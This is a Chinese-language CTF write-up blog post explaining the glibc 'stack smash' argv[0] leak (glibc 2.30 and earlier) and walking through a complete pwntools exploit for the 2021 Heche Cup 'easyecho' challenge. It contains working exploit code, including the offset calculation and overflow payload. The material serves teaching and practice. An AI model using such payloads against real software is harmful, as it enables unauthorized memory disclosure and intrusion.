# Stack Smash Attack


## Stack Smash

Stack Smash是一种利用Canary机制本身的缺陷达到信息泄露效果的一种栈溢出利用方式。该方法不需要绕过Canary保护就可以泄露内存或栈中保存的信息。大概原理是：当Canary机制检测到栈溢出时（也就是自身的值被改写的时候），会触发`__stack_chk_fail`函数，这个函数又会调用` __fortify_fail `函数向屏幕上输出一段信息来提示用户检测到栈溢出，随后程序被终止运行。提示的内容如下所示：

![stack smashing detected](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231213162728806.png)

这时我们会发现，这个提示还会输出当前文件的路径，那么我们是否可以利用这个路径带出一些其他东西呢。先来看下`__stack_chk_fail`的源码：

```c
#include <stdio.h>
#include <stdlib.h>


extern char **__libc_argv attribute_hidden;

void
__attribute__ ((noreturn))
__stack_chk_fail (void)
{
  __fortify_fail ("stack smashing detected");
}

strong_alias (__stack_chk_fail, __stack_chk_fail_local)
```

`__stack_chk_fail`函数只是调用了`__fortify_fail ("stack smashing detected")`而已，我们继续看`__fortify_fail`的源码：

```c
#include <stdio.h>
#include <stdlib.h>


extern char **__libc_argv attribute_hidden;

void
__attribute__ ((noreturn)) internal_function
__fortify_fail (const char *msg)
{
  /* The loop is added only to keep gcc happy.  */
  while (1)
    __libc_message (2, "*** %s ***: %s terminated\n",
		    msg, __libc_argv[0] ?: "<unknown>");
}
libc_hidden_def (__fortify_fail)
```

`__fortify_fail`函数则是负责调用`__libc_message`输出栈溢出信息。由于每个程序的`argv[0]`变量都存放着程序的名称，那么这个函数就会同时将程序名称打印出来。

值得一提的是，`__libc_argv[0]`也存在于栈上，因此我们借助栈溢出的机会可以同时修改它的值，让它指向我们想要的内存区域。那么最后它就会帮我们泄露内存信息。

> 此漏洞仅限Glibc 2.30及之前的版本，较新的Glibc不再输出argv[0]。

## Exploit

以经典的Stack Smashing题目演示利用手段。题目为2021鹤城杯 easyecho。

实际上在Stack Smashing的利用过程中只需要考虑一件事情，就是找到`__libc_argv[0]`在栈上的位置（相对溢出点的位置），这样我们才能覆盖。其他的一切libc会帮我们完成。

一种方法是直接在栈上找，观察栈上有没有存放着有关程序路径的地方，下面就是一个可疑点：

![path](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231213165508280.png)

此处存放着0x7fffffffde18，而0x7fffffffde18又指向0x7fffffffe0c9，我们发现0x7fffffffe0c9处刚好存放着程序路径。也就是说，**0x7fffffffde18**就是argv[0]。

![argv](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231213165720647.png)

第二种方法直接在gdb上打印`__libc_argv[0]`变量的地址即可。

![print](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231213170056611.png)

最终确定argv[0]在0x7fffffffde18的地址处。

> 为什么一定要获得指向path的地址而不是直接修改path？当然是都可以，但是哪种方便呢？

继续观察溢出点，发现argv[0]在栈上的位置相对于溢出点相差0x7fffffffde18-0x7fffffffdcb0=0x168字节的位置。那么我们填满0x168字节后既可以覆盖到argv[0]。

![image-20231213170527877](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231213170527877.png)

根据题目，flag存放在base + 0x202040的地方（base是程序基址)。于是payload就为：

```python
flag = base + 0x202040
payload = 0x168 * b'A' + p64(flag)
```

由于0x168个字节早就覆盖掉rbp了，因此直接结束程序就可以看到结果：

![pwn](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231213171056246.png)

完整的exp:

```python
from pwn import *
from pwn import p64,u64

context.terminal=['tmux','splitw','-h']
# context.log_level='debug'
elf = ELF('./easyecho')
r = elf.process()
# r = remote('node4.anna.nssctf.cn',28710)

payload = b'A' * 0x10
r.sendafter(b'Name: ',payload)
r.recv(24)
base = u64(r.recv(6).ljust(8,b'\x00')) - 0xcf0
info(hex(base))
# gdb.attach(r)
# pause()
r.sendlineafter(b'Input: ',b'backdoor')
flag = base + 0x202040
payload = 0x168 * b'A' + p64(flag)

r.sendlineafter(b'Input: ',payload)
r.sendlineafter(b'Input: ', b'exitexit')

r.interactive()
```



---

> 作者: alextang  
> URL: https://alextang.top/articles/2023/12/stack_smash/  

